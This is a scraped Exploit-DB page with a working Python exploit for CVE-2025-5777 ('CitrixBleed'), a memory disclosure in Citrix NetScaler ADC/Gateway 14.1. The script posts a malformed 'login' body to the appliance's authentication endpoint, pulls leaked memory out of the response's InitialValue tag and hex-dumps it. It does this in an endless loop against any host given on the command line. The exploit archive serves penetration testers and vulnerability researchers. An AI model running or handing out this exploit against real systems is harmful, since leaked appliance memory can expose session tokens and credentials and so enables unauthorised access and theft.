---
title: [remote] Citrix NetScaler ADC/Gateway 14.1 - Memory Disclosure
url: https://www.exploit-db.com/exploits/52401
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:09.465753
---

# [remote] Citrix NetScaler ADC/Gateway 14.1 - Memory Disclosure

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Citrix NetScaler ADC/Gateway 14.1 - Memory Disclosure

#### EDB-ID:

###### 52401

#### CVE:

###### [2025-5777](https://nvd.nist.gov/vuln/detail/CVE-2025-5777)

---

**EDB Verified:**

#### Author:

###### [Yesith Alvarez](/?author=11636)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
# Exploit Title: Citrix NetScaler ADC/Gateway 14.1 - Memory Disclosure
# Exploit Author: Yesith Alvarez
# Vendor Homepage: hhttps://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420
# CVE: CVE-2025-5777
# Link: https://github.com/yealvarez/CVE/blob/main/CVE-2025-5777/exploit.py

import re
import sys
import warnings
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print(r'''
  ______     _______     ____   ___ ____  ____       ____ _____ _____ _____
 / ___\ \   / / ____|   |___ \ / _ \___ \| ___|     | ___|___  |___  |___  |
| |    \ \ / /|  _| _____ __) | | | |__) |___ \ ____|___ \  / /   / /   / /
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____|__) |/ /   / /   / /
 \____|  \_/  |_____|   |_____|\___/_____|____/     |____//_/   /_/   /_/

[+] CitrixBleed - Memory Disclosure (Out-of-Bounds Read)
[+] Author: Yesith Alvarez
[+] Github: https://github.com/yealvarez
[+] Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
[+] Code improvements: https://github.com/yealvarez/CVE/blob/main/CVE-2025-5777/exploit.py
    ''')

def print_hex(data: bytes):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = " ".join(f"{b:02X}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        print("{:08X}".format(i) + "  " + "{:<47}".format(hex_part) + "  " + ascii_part)

def extraction(blob: bytes) -> bytes | None:
    OpenInitialValue = "<InitialValue>".encode("utf-8")
    closenitialValue = "</InitialValue>".encode("utf-8")
    matched = "(.*?)".encode("utf-8")
    extract = re.compile(re.escape(OpenInitialValue) + matched  + re.escape(closenitialValue),flags=re.DOTALL | re.IGNORECASE)
    m = extract.search(blob)
    return None if m is None else m.group(1)

def exploit(target: str):
    url = "https://"+target+"/p/u/doAuthentication.do"

    headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    }

    try:
        resp = requests.post(
            url,
            data="login".encode("utf-8"),
            headers=headers,
            timeout=15,
            verify=False,
        )
        resp.raise_for_status()
    except Exception as e:
        print("["+target+"] Error No Vulnerable: " + str(e))
        return

    binary = extraction(resp.content)
    if binary is None:
        print("["+target+"] Connection Error ")
        return
    print("\n[+] Captured "+str(len(binary))+" bytes from the Target ["+target+"]:\n")
    print_hex(binary)

if __name__ == '__main__':
    warnings.simplefilter("ignore", InsecureRequestWarning)
    title()
    if len(sys.argv) < 2:
        print('[+] USAGE: python3'+sys.argv[0]+' <target.host>\n')
        print('[+] Example: python3'+sys.argv[0]+' 10.10.10.10\n')
        sys.exit(0)
    else:
        target = sys.argv[1]
        try:
            while True:
                exploit(target)

        except KeyboardInterrupt:
            print("\n[+] Stopped by user.")
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designe...